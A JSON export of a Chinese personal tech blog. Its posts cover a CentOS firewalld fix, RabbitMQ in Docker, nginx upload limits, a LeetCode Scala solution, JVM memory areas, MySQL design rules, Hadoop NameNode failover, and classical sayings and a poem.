弄阔了，后来难乎其继。三十不立，四十见恶，五十相将寻死路。见怪不怪，怪乃自败。一正压百邪，少见必多怪。君子之交淡以成，小人之交甘以坏。爱人者，人恒爱。敬人者，人恒敬。损友敬而远，益友亲而敬。善与人交，久而能敬。过则相规，言而有信。木受绳则直，人受柬则圣。良药苦口利于病，忠言逆耳利于行。智生识，识生断。当断不断，反受其乱。一毫之恶，劝人莫作；一毫之善，与人方便。难合亦难分，易亲亦易散。传家二字耕与读，防家二字盗与奸，倾家二字淫与赌，守家二字勤与俭。不汲汲于富贵，不戚戚于贫贱。素位而行，不尤不怨。先达之人可尊也，不可比媚。权势之人可远也，不可侮慢。善有善报，恶有恶报，若有不报，日子未到。贤者不炫已之长，君子不夺人所好。救既败之事，如驭临岩之马，休轻加一鞭；图垂成之功，如挽上滩之舟，莫稍停一棹。大事不糊涂，小事不渗漏。内藏精明，外示浑厚。恩宜先淡而浓，先浓后淡者，人忘其惠；威宜自严而宽，先宽后严者，人怨其酷。以积货财之心积学问，则盛德日新；以爱妻子之心爱父母，则孝行自笃。学须静，才须学。非学无以广才，非静无以成学。不患老而无成，只怕幼而不学。富贵如刀兵戈矛，稍放纵便销膏靡骨而不知；贫贱如针砭药石，一忧勤即砥节砺行而不觉。不矜细行，终累大德。亲戚不悦，无务外交；事不终始，无务多业。民为邦本，本固邦宁。安居饱食，天下太平。临难勿苟免，临财勿苟得。谗言不可听，听之祸殃结。君听臣遭诛，父听子遭灭，夫妇听之离，兄弟听之别，朋友听之疏，亲戚听之绝。性天澄澈，即饥餐渴饮，无非康济身肠；心地沉迷，纵演偈谈玄，总是播弄精魄。芝兰生于深林，不以无人而不芳；君子修其道德，不为穷困而改节。廉官可酌贪泉水，志士不受嗟来食。","updated":"2020-07-19T00:23:28.415Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"Failed to start firewalld - dynamic firewall daemon","date":"2018-12-14T09:00:00.000Z","path":"2018/12/14/linux/problem/firewalld启动失败/","text":"centos7启动防火墙失败,操作超时。 1systemctl start firewalld [root@bogon ~]# systemctl start firewalldJob for firewalld.service failed because a timeout was exceeded. See “systemctl status firewalld.service” and “journalctl -xe” for details. [root@bogon ~]# systemctl status firewalld● firewalld.service - firewalld - dynamic firewall daemon Loaded: loaded t: enabled) Active: failed (Result: timeout) since 六 2018-12-15 00:54:55 CST; 42s ag(/usr/lib/systemd/system/firewalld.service; enabled; vendor preseo Docs: man:firewalld(1) Process: 14218 ExecStart=/usr/sbin/firewalld —nofork —nopid $FIREWALLD_ARGS (code=exited, status=0/SUCCESS) Main PID: 14218 (code=exited, status=0/SUCCESS) 12月 15 00:53:23 bogon systemd[1]: Starting firewalld - dynamic firewall daemon…12月 15 00:54:53 bogon systemd[1]: firewalld.service start operation timed out. Terminating.12月 15 00:54:55 bogon systemd[1]: Failed to start firewalld - dynamic firewall daemon.12月 15 00:54:55 bogon systemd[1]: Unit firewalld.service entered failed state.12月 15 00:54:55 bogon systemd[1]: firewalld.service failed. 算是centos7的一个bug吧,执行下面命令即可 1[root@bogon ~]# systemctl stop firewalld;pkill -f firewalld;systemctl start firewalld 查看防火墙状态 12345678910111213141516171819202122[root@bogon ~]# systemctl status firewalld● firewalld.service - firewalld - dynamic firewall daemon Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled) Active: active (running) since 六 2018-12-15 00:56:19 CST; 11s ago Docs: man:firewalld(1) Main PID: 14638 (firewalld) Tasks: 2 Memory: 21.6M CGroup: /system.slice/firewalld.service └─14638 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid12月 15 00:56:20 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -D FORWARD -i docker0 -o docker0 -j DROP'...hain?).12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t nat -C DOCKER -p tcp -d 0/0 --dport 15...t name.12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t filter -C DOCKER ! -i docker0 -o docke...hain?).12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t nat -C POSTROUTING -p tcp -s 172.17.0....t name.12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t nat -C DOCKER -p tcp -d 0/0 --dport 56...t name.12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t filter -C DOCKER ! -i docker0 -o docke...hain?).12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t nat -C POSTROUTING -p tcp -s 172.17.0....t name.12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t filter -n -L DOCKER-USER' failed: ipta...t name.12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t filter -C DOCKER-USER -j RETURN' faile...hain?).12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '/usr/sbin/iptables -w2 -t filter -C FORWARD -j DOCKER-USER' fail...t name.Hint: Some lines were ellipsized, use -l to show in full. 参考资料 CentOS 7: Firewalld.service Operation Time Out – Systemctl Firewalld Issues","updated":"2020-07-19T00:23:27.892Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"rabbitmq安装(docker)","date":"2018-12-14T07:30:00.000Z","path":"2018/12/14/mq/rabbitmq安装(docker)/","text":"docker的安装此处不做过多介绍,可参考官网安装即可。 安装搜索要下载的rabbitmq,123456789101112131415161718192021222324252627[root@bogon ~]# docker search rabbitmqNAME DESCRIPTION STARS OFFICIAL AUTOMATEDrabbitmq RabbitMQ is an open source multi-protocol me… 2372 [OK] bitnami/rabbitmq Bitnami Docker Image for RabbitMQ 25 [OK]tutum/rabbitmq Base docker image to run a RabbitMQ server 19 frodenas/rabbitmq A Docker Image for RabbitMQ 12 [OK]kbudde/rabbitmq-exporter rabbitmq_exporter for prometheus 9 [OK]sysrun/rpi-rabbitmq RabbitMQ Container for the Raspberry Pi 2 (b… 7 arm32v7/rabbitmq RabbitMQ is an open source multi-protocol me… 7 gonkulatorlabs/rabbitmq DEPRECATED: See maryville/rabbitmq 5 [OK]cyrilix/rabbitmq-mqtt RabbitMQ MQTT Adapter 4 [OK]aweber/rabbitmq-autocluster RabbitMQ with the Autocluster Plugin 4 pivotalrabbitmq/rabbitmq-autocluster RabbitMQ with the rabbitmq-autocluster plugi… 3 mikaelhg/docker-rabbitmq RabbitMQ in Docker. 3 [OK]luiscoms/openshift-rabbitmq RabbitMQ docker image to use on Openshift ba… 3 [OK]pivotalrabbitmq/rabbitmq-server-buildenv Image used to build and test RabbitMQ server… 2 gavinmroy/alpine-rabbitmq-autocluster Minimal RabbitMQ image with the autocluster … 2 authentise/rabbitmq A RabbitMQ image that will run a bash script… 2 [OK]webhostingcoopteam/rabbitmq-conf RabbitMQ Configurator for Rancher 1 [OK]henrylv206/rabbitmq-autocluster RabbitMQ Cluster 1 [OK]cvtjnii/rabbitmq 1 foxylion/rabbitmq Preconfigured RabbitMQ docker image with sup… 1 [OK]pdffiller/rabbitmq Rabbitmq 3.7.3 with delayed_message plugin,c… 0 newsdev/rabbitmq rabbitmq:olympics Extends official rabbitmq … 0 [OK]deadtrickster/rabbitmq_prometheus RabbitMQ + Prometheus RabbitMQ Exporter plug… 0 ekesken/rabbitmq docker image for rabbitmq that is configurab… 0 [OK]vituity/openshift-rabbitmq RabbitMQ for OpenShift 下载对应的版本,此处下载第一个官方版本。默认latest是没有web管理界面的，下载tag为management的带有web管理界面。 12345678910111213141516[root@bogon ~]# docker pull rabbitmq:managementmanagement: Pulling from library/rabbitmqf17d81b4b692: Downloading [===================&gt; ] 8.981MB/22.49MB02fe1bd1a85c: Download complete 66c15a50f4da: Download complete 771c4c62018c: Download complete 05e166e2684c: Download complete 5eb4efce3466: Downloading [=======&gt; ] 4.226MB/27.5MB9b5d77af0f63: Downloading [================&gt; ] 3.493MB/10.34MBf7fc14f8eeeb: Waiting 31e1448101d9: Waiting 196612f40314: Waiting 8cd7ab5c5659: Waiting aae6dd0bf4aa: Waiting c8f2ac2cd4e8: Waiting 98e5c73758c4: Waiting 等待执行完成即可。 启动这个镜像 123[root@bogon ~]# docker run -d -p 5672:5672 -p 15672:15672 --name rabbitmq rabbitmq:managementc3a9f6d71ad22d14ec12e488a1917fbe59c7a6f18414402e3eac2418769c3fdf 查看日志 1[root@bogon ~]# docker logs c3a9f6d71ad22d14ec12e488a1917fbe59c7a6f18414402e3eac2418769c3fdf 查看启动状态1234[root@bogon ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc3a9f6d71ad2 rabbitmq:management \"docker-entrypoint.s…\" 8 minutes ago Up 8 minutes 4369/tcp, 5671/tcp, 0.0.0.0:5672-&gt;5672/tcp, 15671/tcp, 25672/tcp, 0.0.0.0:15672-&gt;15672/tcp rabbitmq 可见服务正常启动。 接下来，访问web控制台URL 12345678910111213141516171819202122232425262728293031323334[root@bogon ~]# curl localhost:15672&lt;!doctype html&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;RabbitMQ Management&lt;/title&gt; &lt;script src=\"js/ejs-1.0.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/jquery-1.12.4.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/jquery.flot-0.8.1.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/jquery.flot-0.8.1.time.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/sammy-0.7.6.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/json2-2016.10.28.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/base64.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/global.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/main.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/prefs.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/formatters.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;script src=\"js/charts.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;link href=\"css/main.css\" rel=\"stylesheet\" type=\"text/css\"/&gt; &lt;link href=\"favicon.ico\" rel=\"shortcut icon\" type=\"image/x-icon\"/&gt;&lt;!--[if lte IE 8]&gt; &lt;script src=\"js/excanvas.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;link href=\"css/evil.css\" rel=\"stylesheet\" type=\"text/css\"/&gt;&lt;![endif]--&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"outer\"&gt;&lt;/div&gt; &lt;div id=\"debug\"&gt;&lt;/div&gt; &lt;div id=\"scratch\"&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 这样就正常启动了,正常使用即可。 参考资料 docker官网 《docker技术入门与实战》","updated":"2020-07-19T00:23:27.898Z","tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://xwolf191.github.io/tags/rabbitmq/"}]},{"title":"七弦叹","date":"2018-12-13T04:25:00.000Z","path":"2018/12/13/杂侃/七弦叹/","text":"七弦叹 一弦叹，叹长安，灯火阑珊，九州共婵娟，盛世烟花纷繁，大明宫外皓月圆； 二弦叹，叹临安，西子湖畔，无言泪阑干，独行烟柳青山，烟雨如梦梦江南； 三弦叹，叹金陵，乍雨初晴，陌上离人行，古道荒草长亭，红颜若雪愁思萦； 四弦叹，叹姑苏，烟雨难渡，不见当年路，不知船向何处，谁人知我相思苦？ 五弦叹，叹汴梁，人走茶凉，花落终成殇，一城风雨彷徨，落雨空响青石巷； 六弦叹，叹阳关，千年尘烟，一缕箫声咽，曲未终人已散，惟有山河寂无言； 七弦叹，叹流年，过眼云烟，往事随风远，多少悲欢离散，梦醒沧海变桑田。","updated":"2020-07-19T00:23:28.410Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"413 Request Entity Too Large","date":"2018-12-11T03:10:00.000Z","path":"2018/12/11/java/exception/413 Request Entity Too Large/","text":"通过nginx的代理层上传文件,出现这个错误。大意很简单，请求体太长,意思是文件的尺寸太大。需要调整client_max_body_size 的大小,默认大小为1m.可以在 server、location、http等位置处配置此参数。 咱们在server下配置,文件大小最大5m。1client_max_body_size 5m; 配置完成后,重启nginx,但是偶尔会报Gateway 504 Time out。修改代理的超时时间问题解决: 12345678location ^~/api/v1/human &#123; proxy_pass http://localhost:8082; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 70s; proxy_send_timeout 70s; proxy_read_timeout 70s; &#125; 参考资料 nginx官网配置文档","updated":"2020-07-19T00:23:27.854Z","tags":[{"name":"exception","slug":"exception","permalink":"http://xwolf191.github.io/tags/exception/"}]},{"title":"389. Find the Difference","date":"2018-12-05T04:30:00.000Z","path":"2018/12/05/数据结构和算法/leetcode/Find the difference/","text":"Given two strings s and t which consist of only lowercase letters. String t is generated by random shuffling string s and then add one more letter at a random position. Find the letter that was added in t. Example: Input:s = “abcd”t = “abcde” Output:e Explanation:‘e’ is the letter that was added. 题意描述两个都是由小写字母组成的字符串s和t,t是由s中的字符随机组合和一个任意位置的一个字母组成。找到这个字母。 分析本题根本上是简化版的求最大的公共子串,排序两个字符串后将t的公共子串部分截取,剩下的字符既是要求的字符。 实现 scala 1234567891011121314151617import util.control.Breaks._object FindtheDifference &#123; def findTheDifference(s: String, t: String): Char = &#123; val a = t.sorted val b = s.sorted val sb = new StringBuilder breakable(for (i&lt;-0 until b.length)&#123; if (a.charAt(i).equals(b.charAt(i))) &#123; sb.append(a.charAt(i)) &#125; else &#123; break() &#125; &#125;) a.replaceFirst(sb.toString.sorted,\"\").charAt(0) &#125; 参考资料 Find the Difference","updated":"2020-07-19T00:23:28.025Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"JVM内存区域","date":"2018-11-01T08:45:00.000Z","path":"2018/11/01/java/jvm/JVM内存区域/","text":"Java 虚拟机定义了在程序执行期间使用的各种运行时数据区域。其中一些数据区域是在 Java 虚拟机启动时创建的，仅在 Java 虚拟机退出时销毁。其他数据区域仅在当前线程有效。线程数据区域是在线程创建时创建和销毁线程时销毁的,和线程同生共死。本节以 JDK1.8 为例来探讨 java 的内存区域和内存溢出异常诊断。 一、 java 内存区域java 运行时数据区域一共包括六个部分,pc 寄存器(程序计数器)、堆、栈、方法区、本地方法栈、运行时常量池。 pc 寄存器(程序计数器)Java 虚拟机可以同时支持许多执行线程。每个 Java 虚拟机线程都有自己的 pc（程序计数器）寄存器。在任何时候，每个 Java 虚拟机线程都在执行单个方法的代码，即该线程的当前方法。如果该方法不是本机方法，则 pc 寄存器包含当前正在执行的 Java 虚拟机指令的地址。如果线程当前正在执行的方法是 native 的,则 Java 虚拟机的 pc 寄存器的值是未定义的。Java 虚拟机的 pc 寄存器足够宽,可以在特定平台上保存returnAddress或本机指针。程序计数器也是 java 内存区域中唯一一块没有 OutOfMemeryError 的区域。 堆Java 虚拟机具有在所有 Java 虚拟机线程之间共享的堆。堆是运行时数据区，从中分配所有类实例和数组的内存。 堆是在虚拟机启动时创建的。对象的堆存储由自动存储管理系统（称为垃圾收集器）回收;对象永远不会被显式释放。 Java 虚拟机假设没有特定类型的自动存储管理系统，可以根据实现者的系统要求选择存储管理技术。堆可以具有固定大小，或者可以根据计算的需要进行扩展，并且如果不需要更大的堆，则可以收缩。堆的内存不需要是连续的。 Java 虚拟机实现可以为程序员或用户提供对堆的初始大小的控制，以及如果可以动态扩展或收缩堆，控制最大和最小内存空间限制。 以下异常情况与堆相关联： 如果计算需要的堆数超过自动存储管理系统可用的堆，则 Java 虚拟机会抛出 OutOfMemoryError。 栈每个 Java 虚拟机线程都有一个私有 Java 虚拟机堆栈，与线程同时创建。 Java 虚拟机堆栈存储帧。 Java 虚拟机堆栈类似于传统语言的堆栈，例如 C：它保存局部变量和部分结果，并在方法调用和返回中起作用。由于除了推送和弹出帧之外，永远不会直接操作 Java 虚拟机堆栈，因此可以对堆进行堆分配。 Java 虚拟机堆栈的内存不需要是连续的。 在 Java® 虚拟机规范的第一版中，Java 虚拟机堆栈称为 Java 堆栈。 此规范允许 Java 虚拟机堆栈具有固定大小或根据计算的需要动态扩展和收缩。如果 Java 虚拟机堆栈具有固定大小，则可以在创建该堆栈时独立选择每个 Java 虚拟机堆栈的大小。 Java 虚拟机实现可以为程序员或用户提供对 Java 虚拟机堆栈的初始大小的控制，以及在动态扩展或收缩 Java 虚拟机堆栈的情况下，控制最大和最小内存空间限制。 以下异常条件与 Java 虚拟机堆栈相关联： 如果线程中的计算需要比允许的更大的 Java 虚拟机堆栈，则 Java 虚拟机会抛出 StackOverflowError。 如果可以动态扩展 Java 虚拟机堆栈，并且尝试进行扩展但可以使内存不足以实现扩展，或者可以使内存不足以为新线程创建初始 Java 虚拟机堆栈，则 Java Virtual 机器抛出 OutOfMemoryError。 方法区Java 虚拟机具有在所有 Java 虚拟机线程之间共享的方法区域。方法区域类似于传统语言的编译代码的存储区域或类似于操作系统进程中的“text”段。它存储每个类的结构，例如运行时常量池，字段和方法数据，以及方法和构造函数的代码，包括类和实例初始化以及接口初始化中使用的特殊方法。 方法区域是在虚拟机启动时创建的。虽然方法区域在逻辑上是堆的一部分，但是简单的实现可能选择不垃圾收集或压缩它。本规范未规定方法区域的位置或用于管理编译代码的策略。方法区域可以是固定大小的，或者可以根据计算的需要进行扩展，并且如果不需要更大的方法区域，则可以缩小方法区域。方法区域的内存不需要是连续的。以下异常条件与方法区域相关联： 如果无法使方法区域中的内存满足分配请求，则 Java 虚拟机将抛出 OutOfMemoryError。 本地方法栈Java 虚拟机的实现可以使用传统的堆栈，俗称“C 栈”，以支持本机方法（用 Java 编程语言以外的语言编写的方法）。本机方法堆栈也可以用于以诸如 C 语言的 Java 虚拟机的指令集的解释器的实现来使用。无法加载本机方法并且本身不依赖于传统堆栈的 Java 虚拟机实现不需要提供本机方法栈。如果提供，则通常在创建每个线程时为每个线程分配本机方法堆栈。 此规范允许本机方法堆栈具有固定大小或根据计算的需要动态扩展和收缩。如果本机方法堆栈具有固定大小，则可以在创建该堆栈时独立地选择每个本机方法堆栈的大小。 Java 虚拟机实现可以为程序员或用户提供对本机方法堆栈的初始大小的控制，以及在不同大小的本机方法堆栈的情况下，控制最大和最小方法堆栈大小。 以下异常条件与本机方法堆栈相关联： 如果线程中的计算需要比允许的更大的本机方法堆栈，则 Java 虚拟机会抛出 StackOverflowError。 如果可以动态扩展本机方法堆栈并尝试本机方法堆栈扩展但可用内存不足，或者如果可用内存不足以为新线程创建初始本机方法堆栈，则 Java 虚拟机会抛出 OutOfMemoryError 。 运行时常量池运行时常量池是 class 文件中 constant_pool 表的每类或每接口运行时表示。它包含几种常量，从编译时已知的数字文字到必须在运行时解析的方法和字段引用。运行时常量池提供类似于传统编程语言的符号表的功能，尽管它包含比典型符号表更宽范围的数据。每个运行时常量池都是从 Java 虚拟机的方法区中分配的。当 Java 虚拟机创建类或接口时，将构造类或接口的运行时常量池。 在常量池中可能会抛出下边的异常: 如果内存不足以分配新的空间,则会抛出 OutOfMemoryError。 如有错误,欢迎批评指正,望不吝赐教。 参考资料 《深入理解 java 虚拟机》周志明著 The Java Virtual Machine Specification Java SE 8 Edition 各个版本的 java&amp;虚拟机规范文档","updated":"2020-07-19T00:23:27.864Z","tags":[{"name":"jvm","slug":"jvm","permalink":"http://xwolf191.github.io/tags/jvm/"}]},{"title":"mysql数据库设计规范","date":"2018-10-16T01:45:00.000Z","path":"2018/10/16/数据库/mysql/mysql数据库设计/","text":"军规适用场景：并发量大、数据量大的互联网业务 军规：介绍内容 解读：讲解原因，解读比军规更重要 一、基础规范1. 必须使用InnoDB存储引擎解读：支持事务、行级锁、并发性能更好、CPU及内存缓存页优化使得资源利用率更高 2. 必须使用UTF8字符集解读：万国码，无需转码，无乱码风险，节省空间（由于移动设备原因最好使用utf8mb4) 3. 数据表、数据字段必须加入中文注释解读：N年后谁tm知道这个r1,r2,r3字段是干嘛的 4. 禁止使用存储过程、视图、触发器、Event解读：高并发大数据的互联网业务，架构设计思路是“解放数据库CPU，将计算转移到服务层”，并发量大的情况下，这些功能很可能将数据库拖死，业务逻辑放到服务层具备更好的扩展性，能够轻易实现“增机器就加性能”。数据库擅长存储与索引，CPU计算还是上移吧 5. 禁止存储大文件或者大照片解读：为何要让数据库做它不擅长的事情？大文件和照片存储在文件系统，数据库里存URI多好 二、命名规范6. 只允许使用内网域名，而不是ip连接数据库7. 线上环境、开发环境、测试环境数据库内网域名遵循命名规范(虽然IP访问更快，域名访问需要内网dns,但是对于大数据库的扩展和迁库考虑，域名更好）业务名称：xxx 线上环境：dj.xxx.db 开发环境：dj.xxx.rdb 测试环境：dj.xxx.tdb 从库在名称后加-s标识，备库在名称后加-ss标识 线上从库：dj.xxx-s.db 线上备库：dj.xxx-sss.db 8. 库名、表名、字段名：小写，下划线风格，不超过32个字符，必须见名知意，禁止拼音英文混用9. 表名t_xxx，非唯一索引名idx_xxx，唯一索引名uniq_xxx三、表设计规范10. 单实例表数目必须小于50011. 单表列数目必须小于3012. 表必须有主键，例如自增主键解读： a）主键递增，数据行写入可以提高插入性能，可以避免page分裂，减少表碎片提升空间和内存的使用 b）主键要选择较短的数据类型， Innodb引擎普通索引都会保存主键的值，较短的数据类型可以有效的减少索引的磁盘空间，提高索引的缓存效率 c） 无主键的表删除，在row模式的主从架构，会导致备库夯住 13. 禁止使用外键，如果有外键完整性约束，需要应用程序控制解读：外键会导致表与表之间耦合，update与delete操作都会涉及相关联的表，十分影响sql 的性能，甚至会造成死锁。高并发情况下容易造成数据库性能，大数据高并发业务场景数据库使用以性能优先 四、字段设计规范14. 必须把字段定义为NOT NULL并且提供默认值解读： a）null的列使索引/索引统计/值比较都更加复杂，对MySQL来说更难优化 b）null 这种类型MySQL内部需要进行特殊处理，增加数据库处理记录的复杂性；同等条件下，表中有较多空字段的时候，数据库的处理性能会降低很多 c）null值需要更多的存储空，无论是表还是索引中每行中的null的列都需要额外的空间来标识 d）对null 的处理时候，只能采用is null或is not null，而不能采用=、in、&lt;、&lt;&gt;、!=、not in这些操作符号。如：where name!=’shenjian’，如果存在name为null值的记录，查询结果就不会包含name为null值的记录 15. 禁止使用TEXT、BLOB类型解读：会浪费更多的磁盘和内存空间，非必要的大量的大字段查询会淘汰掉热数据，导致内存命中率急剧降低，影响数据库性能 16. 禁止使用小数存储货币（可以把单位算作分，显示和计算时x100,…）解读：使用整数吧，小数容易导致钱对不上 17. 必须使用varchar(20)存储手机号解读： a）涉及到区号或者国家代号，可能出现+-() b）手机号会去做数学运算么？ c）varchar可以支持模糊查询，例如：like“138%” 18. 禁止使用ENUM，可使用TINYINT代替解读： a）增加新的ENUM值要做DDL操作 b）ENUM的内部实际存储就是整数，你以为自己定义的是字符串？ 五、索引设计规范19. 单表索引建议控制在5个以内20. 单索引字段数不允许超过5个解读：字段超过5个时，实际已经起不到有效过滤数据的作用了 21. 禁止在更新十分频繁、区分度不高的属性上建立索引解读： a）更新会变更B+树，更新频繁的字段建立索引会大大降低数据库性能 b）“性别”这种区分度不大的属性，建立索引是没有什么意义的，不能有效过滤数据，性能与全表扫描类似 22. 建立组合索引，必须把区分度高的字段放在前面解读：能够更加有效的过滤数据 六、SQL使用规范23. 禁止使用SELECT *，只获取必要的字段，需要显示说明列属性解读： a）读取不需要的列会增加CPU、IO、NET消耗 b）不能有效的利用覆盖索引 c）使用SELECT *容易在增加或者删除字段后出现程序BUG 24. 禁止使用INSERT INTO t_xxx VALUES(xxx)，必须显示指定插入的列属性解读：容易在增加或者删除字段后出现程序BUG 25. 禁止使用属性隐式转换解读：SELECT uid FROM t_user WHERE phone=13812345678 会导致全表扫描，而不能命中phone索引，猜猜为什么？（这个线上问题不止出现过一次） int数据类型优先级高于archer， 该查询会把phone转换为int，因此需要把表中所有数据改成int，所以必须全盘扫描 26. 禁止在WHERE条件的属性上使用函数或者表达式解读：SELECT uid FROM t_user WHERE from_unixtime(day)&gt;=’2017-02-15’ 会导致全表扫描 正确的写法是：SELECT uid FROM t_user WHERE day&gt;= unix_timestamp(‘2017-02-15 00:00:00’) 27. 禁止负向查询，以及%开头的模糊查询解读： a）负向查询条件：NOT、!=、&lt;&gt;、!&lt;、!&gt;、NOT IN、NOT LIKE等，会导致全表扫描 b）%开头的模糊查询，会导致全表扫描 28. 禁止大表使用JOIN查询，禁止大表使用子查询解读：会产生临时表，消耗较多内存与CPU，极大影响数据库性能 29. 禁止使用OR条件，必须改为IN查询解读：旧版本Mysql的OR查询是不能命中索引的，即使能命中索引，为何要让数据库耗费更多的CPU帮助实施查询优化呢？ 30. 应用程序必须捕获SQL异常，并有相应处理总结：大数据量高并发的互联网业务，极大影响数据库性能的都不让用，不让用哟。 参考资料 MySQL数据库30条规范解读(转载)","updated":"2020-07-19T00:23:28.018Z","tags":[{"name":"mysql","slug":"mysql","permalink":"http://xwolf191.github.io/tags/mysql/"}]},{"title":"hadoop namenode active 和standby切换","date":"2018-09-25T02:11:00.000Z","path":"2018/09/25/大数据/hadoop namenode active 和standby切换/","text":"hadoop namenode 需要的手动激活对应的 namenode,有以下两种方式: hdfs haadmin -transitionToActive 制造故障，自动容错 transitionToActive123456789101112[root@hadoop02 hadoop]# hdfs haadmin -transitionToActive --forcemanual nn1You have specified the --forcemanual flag. This flag is dangerous, as it can induce a split-brain scenario that WILL CORRUPT your HDFS namespace, possibly irrecoverably.It is recommended not to use this flag, but instead to shut down the cluster and disable automatic failover if you prefer to manually manage your HA state.You may abort safely by answering 'n' or hitting ^C now.Are you sure you want to continue? (Y or N) y2019-03-28 19:24:01,673 WARN ha.HAAdmin: Proceeding with manual HA state management even thoughautomatic failover is enabled for NameNode at hadoop02/192.168.19.131:9000transitionToActive: Node nn2 is already activeUsage: haadmin [-ns &lt;nameserviceId&gt;]-transitionToActive [--forceactive] &lt;serviceId&gt;] —forcemanual 这个标记不推荐使用,可能引起脑裂问题.这种方式我试了,但是不行,没有自动切换. 制造故障在 nn1 节点关闭 zkfc 停止 DFSZKFailoverController 服务。则 nn2 会自动成为 active。 1234567891011121314151617[root@hadoop01 logs]# /opt/bigdata/hadoop-3.2.0/sbin/hadoop-daemon.sh stop zkfcWARNING: Use of this script to stop HDFS daemons is deprecated.WARNING: Attempting to execute replacement \"hdfs --daemon stop\" instead.[root@hadoop01 logs]# jps53552 Jps24533 QuorumPeerMain50437 NameNode51271 ResourceManager[root@hadoop01 logs]# /opt/bigdata/hadoop-3.2.0/sbin/hadoop-daemon.sh start zkfcWARNING: Use of this script to start HDFS daemons is deprecated.WARNING: Attempting to execute replacement \"hdfs --daemon start\" instead.[root@hadoop01 logs]# jps24533 QuorumPeerMain50437 NameNode53685 DFSZKFailoverController51271 ResourceManager55453 Jps 执行完成后查看 namenode 的状态: 123[root@hadoop01 logs]# hdfs haadmin -getAllServiceStatehadoop01:9000 standbyhadoop02:9000 active","updated":"2020-07-19T00:23:27.965Z","tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://xwolf191.github.io/tags/hadoop/"}]},{"title":"祎诺成长记录","date":"2018-09-06T13:12:00.000Z","path":"2018/09/06/杂侃/life/祎诺成长记录/","text":"请输入访问密码 Incorrect Password! No content to display! U2FsdGVkX1+5og0jxmizMZtr/ES9G8qJBgnFSi1p0W9r1/kieyVpHr+XeKP0FjJZQTSfWUfUrL9pa1r7YjKTrmKFNU+zyDA9IK5Gn2bRl4L5VpnFs9kY6FhdWbs6kjA6oUSI4wqnKKIQns4FpzZe1pDrgOr1YEX544BUjdHL0WePaKy2+OyrnbVTDLTlL9OLVcNixhlKnogCjegAXTi6TgAGVLYXufsw+0b2RyBVZauIRuy3Mb8Acx65J/ut9y97y988ZJ9ygScpoad2TUNWs7UX0OXloUECHUXH/kHsju4G6s2CD/oAYWlFFxvGEknVU+hH9WZ3IF54nydP9dA3g9f1KeEvMgIIMkK14ahIr9sOfBkNSdf4GXwz1S5ss+bkcYSiEtsYTr2Br22vtmYku5dM5Z4BprNueQISd9tO692ABKcr3PDc4Oy2Q8yDj7mDDW3OR1F4L7l0kGFUFTeg1E12PXwIbcZ0nXvYIEPJqCCFalyjzGkuI+VX/A9WvSGpJgzm9yzA3ktCPYeVS/m/HcVZG6NO9r9J/zhe/YECDkFaBrXQqnLLIIbpsjJsltJ8e/adLsupYeOI72ceIBLTu9S7gZaLMZg3ZmHCeV3KrO3atUMhw37Ad5fS8DqRwnKQRaJ2xS0vJg57C/2wsl6L/F37H6OFB/2eBeXTXK+31WRWGq+NC5RgBshYY7ipwBqDPA2xUCCNsfW/HMa7KCAtMDUGDicDivJjH/fVzjVs6uCjziljjTtrKgRmBcSUz407T6J0UdO2O9gS4AyuuG0BfuC446cYZGD5ZHmVkqMftju7MS0YDlFAPQfEW3XW9V1pC2AQyNvU8r0u+zucDtRYmnZIvreq3OcN9Q5XltgBCybl704oL6OxOxJS6rZ3iXtomd3eBHX5323dYwaZbzzMF4eYe/Ebh6SvIXs8PMPBV8EliNHI69xMq3C3xZvS